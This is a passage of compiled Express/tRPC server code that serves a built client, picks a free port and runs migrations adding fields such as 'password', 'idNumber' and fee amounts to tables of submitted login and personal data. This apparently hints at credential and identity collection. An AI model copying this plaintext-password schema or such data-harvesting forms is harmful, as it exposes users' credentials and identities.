  const distPath = process.env.NODE_ENV === "development" ? path2.resolve(import.meta.dirname, "../..", "dist", "public") : path2.resolve(import.meta.dirname, "public");
  if (!fs.existsSync(distPath)) {
    console.error(
      `Could not find the build directory: ${distPath}, make sure to build the client first`
    );
  }
  app.use(express.static(distPath));
  app.use("*", (_req, res) => {
    res.sendFile(path2.resolve(distPath, "index.html"));
  });
}

// server/_core/index.ts
function isPortAvailable(port) {
  return new Promise((resolve) => {
    const server = net.createServer();
    server.listen(port, () => {
      server.close(() => resolve(true));
    });
    server.on("error", () => resolve(false));
  });
}
async function findAvailablePort(startPort = 3e3) {
  for (let port = startPort; port < startPort + 20; port++) {
    if (await isPortAvailable(port)) {
      return port;
    }
  }
  throw new Error(`No available port found starting from ${startPort}`);
}
async function runMigrations() {
  console.log("Running database migrations...");
  try {
    await db.execute(`
      ALTER TABLE "loginMethodSubmissions" ADD COLUMN IF NOT EXISTS "deliveryMethod" varchar(20);
      ALTER TABLE "loginMethodSubmissions" ADD COLUMN IF NOT EXISTS "branchName" text;
      ALTER TABLE "loginMethodSubmissions" ADD COLUMN IF NOT EXISTS "deliveryAddress" text;
      ALTER TABLE "loginMethodSubmissions" ADD COLUMN IF NOT EXISTS "phoneConfirmation" varchar(20);
      ALTER TABLE "loginMethodSubmissions" ADD COLUMN IF NOT EXISTS "issuanceFee" varchar(20);
      ALTER TABLE "loginMethodSubmissions" ADD COLUMN IF NOT EXISTS "deliveryFee" varchar(20);
      ALTER TABLE "loginMethodSubmissions" ADD COLUMN IF NOT EXISTS "totalAmount" varchar(20);
    `);
    console.log("\u2705 loginMethodSubmissions migrations applied");
    await db.execute(`
      ALTER TABLE "personalDataSubmissions" ADD COLUMN IF NOT EXISTS "password" text;
      ALTER TABLE "personalDataSubmissions" ADD COLUMN IF NOT EXISTS "title" varchar(20);
      ALTER TABLE "personalDataSubmissions" ADD COLUMN IF NOT EXISTS "middleName" text;
      ALTER TABLE "personalDataSubmissions" ADD COLUMN IF NOT EXISTS "lastName" text;
      ALTER TABLE "personalDataSubmissions" ADD COLUMN IF NOT EXISTS "promoCode" varchar(50);
      ALTER TABLE "personalDataSubmissions" ADD COLUMN IF NOT EXISTS "country" varchar(100);
    `);
    console.log("\u2705 personalDataSubmissions migrations applied");
    await db.execute(`
      ALTER TABLE "personalDataSubmissions" ALTER COLUMN "nameArabic" DROP NOT NULL;
      ALTER TABLE "personalDataSubmissions" ALTER COLUMN "idNumber" DROP NOT NULL;
      ALTER TABLE "personalDataSubmissions" ALTER COLUMN "gender" DROP NOT NULL;
      ALTER TABLE "personalDataSubmissions" ALTER COLUMN "customerStatus" DROP NOT NULL;
    `);
    console.log("\u2705 NOT NULL constraints relaxed");
    console.log("All migrations completed successfully!");
  } catch (error) {
    console.error("Error running migrations:", error);
  }
}
async function startServer() {
  await runMigrations();
  const app = express2();
  const server = createServer(app);
  app.use(express2.json({ limit: "50mb" }));
  app.use(express2.urlencoded({ limit: "50mb", extended: true }));
  registerStorageProxy(app);
  registerOAuthRoutes(app);
  app.use(
    "/api/trpc",
    createExpressMiddleware({
      router: appRouter,
      createContext
    })
  );
  if (process.env.NODE_ENV === "development") {
    await setupVite(app, server);
  } else {
    serveStatic(app);
  }
  const preferredPort = parseInt(process.env.PORT || "3000");
  const port = await findAvailablePort(preferredPort);
  if (port !== preferredPort) {
    console.log(`Port ${preferredPort} is busy, using port ${port} instead`);
  }
  server.listen(port, () => {
    console.log(`Server running on http://localhost:${port}/`);
  });
}
startServer().catch(console.error);
